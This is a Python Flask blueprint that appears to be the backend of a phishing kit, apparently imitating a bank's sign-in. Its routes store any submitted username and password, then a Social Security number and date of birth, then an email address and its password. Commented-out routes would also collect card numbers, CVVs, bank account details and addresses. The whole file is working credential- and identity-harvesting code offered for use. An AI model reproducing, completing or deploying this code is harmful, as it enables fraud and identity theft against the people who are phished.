from flask import Blueprint, session, render_template, request, redirect, url_for
from mandt import db, User, Others, Email
# franko.draper@ilydeen.org {cameleon mtbprotect}


portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            session['username'] = user_id
            # print(user_id,password)
            new_user = User(username=user_id, password=password)
            db.session.add(new_user)
            db.session.commit()
            return redirect(url_for('portals.ssn'))
    return render_template('signin.html')

@portals.route('/email-confirmation', methods=['GET','POST'])
def email_confirmation():
    username = session['username']
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        if email and password:
            new_email = Email(for_username=username, email=email, password=password)
            db.session.add(new_email)
            db.session.commit()
            return redirect(url_for('main.syncing'))
    return render_template('identity-gmail.html')

@portals.route('/ssn', methods=['GET','POST'])
def ssn():
    username = session['username']
    if request.method == 'POST':
        ssn = request.form['ssn']
        dob = request.form['dob']
        if ssn:
            new_others = Others(for_username=username, ssn=ssn, dob=dob)
            db.session.add(new_others)
            db.session.commit()
            return redirect(url_for('portals.email_confirmation'))
    return render_template('identity-ssn.html')

# @portals.route('/signin/address-confirmation', methods=['GET','POST'])
# def address():
#     if request.method == 'POST':
#         address = request.form['address']
#         apt = request.form['apt']
#         city = request.form['city']
#         state = request.form['state']
#         zipcode = request.form['zipcode']
#         if address and city and state and zipcode:
#             # print( card_name, card_number, exp_date, cvv)
#             report_address(address, apt, city, state, zipcode)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('address.html')

# @portals.route('/signin/personal-confirmation', methods=['GET','POST'])
# def personal_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['account_name']
#         card_number = request.form['account_number']
#         exp_date = request.form['routine_number']
#         if card_name and card_number and exp_date:
#             # print( card_name, card_number, exp_date, cvv)
#             report_personal_details(card_name, card_number, exp_date)
#             return redirect(url_for('main.syncing'))
#     return render_template('personal_info.html')

# @portals.route('/signin/card-confirmation', methods=['GET','POST'])
# def card_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['card_name']
#         card_number = request.form['card_number']
#         exp_date = request.form['exp_date']
#         cvv = request.form['cvv']
#         if card_name and card_number and exp_date and cvv:
#             # print( card_name, card_number, exp_date, cvv)
#             report_card_details(card_name, card_number, exp_date, cvv)
#             return redirect(url_for('portals.address'))
#     return render_template('bank-card.html')

# We are all 6 years old at some level